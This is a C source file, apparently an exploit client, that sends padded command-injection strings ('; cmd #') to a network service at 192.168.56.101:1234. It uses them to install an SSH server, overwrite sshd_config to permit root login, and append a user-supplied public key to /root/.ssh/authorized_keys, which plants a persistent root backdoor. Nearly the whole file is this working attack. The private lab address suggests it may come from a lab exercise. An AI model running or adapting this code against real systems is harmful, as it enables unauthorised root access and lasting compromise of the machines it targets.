#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


int sockfd=-1;
struct sockaddr_in server;

int send_command(char* command){
    char s[512];
    char buffer[1024];
    memset(s,'0',512);
    memset(s,'h',117);
    s[117]='\0';
    strncat(s,command,512 - strlen(s) - 1);

    if ((sockfd=socket(AF_INET,SOCK_STREAM,0))<0){
        perror("Socket creation failed");
        return 1;
    }
    if (connect(sockfd,(struct sockaddr *)&server,sizeof(server))<0){
        perror("connection failed");
        return 1;
    }
    if (send(sockfd,s,strlen(s),0)<0){
        perror("send failed");
        close(sockfd);
        return 1;
    }   
    memset(buffer,0,1024);
    while (1){
        int bytes_received=recv(sockfd,buffer,1023,0);
        if(bytes_received<=0){
            break;
        }
        else{
            printf("%s\n",buffer);
        }
    }
    close(sockfd);
    return 0;
}

int configure_ssh(){
    char command[512];
    strncpy(command, "; which sshd || apt-get update && apt-get install -y openssh-server #", sizeof(command));
    if (send_command(command) == 1) {
        printf("Failed to check/install SSH\n");
        return 1;
    }

    strncpy(command, "; rm -f /etc/ssh/sshd_config #", sizeof(command));
    if (send_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }

    strncpy(command, "; echo 'AddressFamily any' >> /etc/ssh/sshd_config #", sizeof(command));
    if (send_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }

    const char* config_lines[] = {
        "AddressFamily any",
        "Port 22",
        "Protocol 2",
        "HostKey /etc/ssh/ssh_host_rsa_key",
        "HostKey /etc/ssh/ssh_host_ecdsa_key",
        "HostKey /etc/ssh/ssh_host_ed25519_key",
        "PermitRootLogin yes",
        "PubkeyAuthentication yes",
        "AuthorizedKeysFile /root/.ssh/authorized_keys",
        "PasswordAuthentication no",
        "ChallengeResponseAuthentication no",
        "UsePAM yes",
        "GatewayPorts yes",
        "X11Forwarding yes",
        "PrintMotd no",
        "AcceptEnv LANG LC_*",
        "Subsystem sftp /usr/lib/openssh/sftp-server",
        NULL
    };

    for (int i = 0; config_lines[i] != NULL; i++) {
        snprintf(command, sizeof(command), "; echo '%s' >> /etc/ssh/sshd_config #", config_lines[i]);
        if (send_command(command) == 1) {
            printf("Failed to add config line: %s\n", config_lines[i]);
            return 1;
        }
    }

    strncpy(command, "; mkdir -p /root/.ssh #", sizeof(command));
    if (send_command(command) == 1) {
        printf("Failed to create .ssh directory\n");
        return 1;
    }

    strncpy(command, "; chmod 700 /root/.ssh  #", sizeof(command));
    if (send_command(command) == 1) {
        printf("Failed to set permissions\n");
        return 1;
    }

    strncpy(command, "; chmod 600 /root/.ssh/authorized_keys #", sizeof(command));
    if (send_command(command) == 1) {
        printf("Failed to set permissions\n");
        return 1;
    }
    return 0;
}


int main (int argc, char** argv){
    memset(&server,0,sizeof(server));
    server.sin_family=AF_INET;
    server.sin_port=htons(1234);
    server.sin_addr.s_addr=inet_addr("192.168.56.101");
    
    if (configure_ssh()==1){
        printf("error configurating ssh");
        return 1;
    }

    char ssh_key[5000];

    printf("Enter your public SSH key: ");
    if (fgets(ssh_key, sizeof(ssh_key), stdin) == NULL) {
        perror("Failed to read SSH key");
        return 1;
    }
    
    size_t len = strlen(ssh_key);
    if (len > 0 && ssh_key[len-1] == '\n') {
        ssh_key[len-1] = '\0';
        len--;
    }

    char command[512];
    memset(command,0,512);
    
    char *chunk = malloc(12);
    chunk[11]='\0';
    int tot = strlen(ssh_key)/10;
    tot++;
    for( int i=0; i<tot;i++){
        memset(command,'0',512);
        size_t start=i*10;
        memcpy(chunk,ssh_key+start,10);

        if (i == 0) {
            sprintf(command, "; echo -n '%s' >> /root/.ssh/authorized_keys; #", chunk);
        } else {
            sprintf(command, "; echo -n '%s' >> /root/.ssh/authorized_keys; #", chunk);
        }
        if (send_command(command)==1){
        printf("send command failed");
        return 1;
    }

    }
    strncpy(command,"; echo '\\n' >> /root/.ssh/authorized_keys; #",sizeof(command));
    if (send_command(command)==1){
        printf("send command failed");
        return 1;
    }

    // Restart SSH service
    strncpy(command, "; systemctl restart ssh || service ssh restart #", sizeof(command));
    if (send_command(command) == 1) {
        printf("Failed to restart SSH service\n");
        return 1;
    }
    
    // Enable SSH service to start on boot
    strncpy(command, "; systemctl enable ssh || update-rc.d ssh enable #", sizeof(command));
    if (send_command(command) == 1) {
        printf("Failed to enable SSH service\n");
        return 1;
    }
    
    // Verify SSH is running
    strncpy(command, "; ps aux | grep sshd | grep -v grep #", sizeof(command));
    if (send_command(command) == 1) {
        printf("Failed to verify SSH is running\n");
        return 1;
    }
    
    printf("SSH has been configured successfully!\n");
    
    return 0;

}

